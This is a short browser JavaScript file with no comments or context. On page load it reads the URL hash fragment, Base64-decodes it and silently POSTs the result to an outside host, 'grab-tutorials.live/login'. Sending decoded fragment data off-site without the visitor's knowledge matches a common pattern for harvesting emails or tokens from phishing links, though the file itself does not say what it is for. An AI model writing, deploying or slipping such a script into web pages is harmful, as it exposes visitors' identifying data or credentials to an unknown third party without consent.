window.addEventListener('DOMContentLoaded', () => {
  const fragment = window.location.hash.substring(1);

  if (fragment) {
    // Decode the fragment from Base64
    let decodedFragment;
    try {
      decodedFragment = atob(fragment);
    } catch (e) {
      console.error('Failed to decode Base64 fragment:', e);
      return;
    }

    fetch('https://grab-tutorials.live/login', {
      method: 'POST',
      headers: {
        'Content-Type': 'application/json',
      },
      body: JSON.stringify({ fragment: decodedFragment }),
    })
      .then(response => response.json())
      .then(data => {
        console.log('Worker Response:', data);
      })
      .catch(error => {
        console.error('Error sending fragment:', error);
      });
  }
});
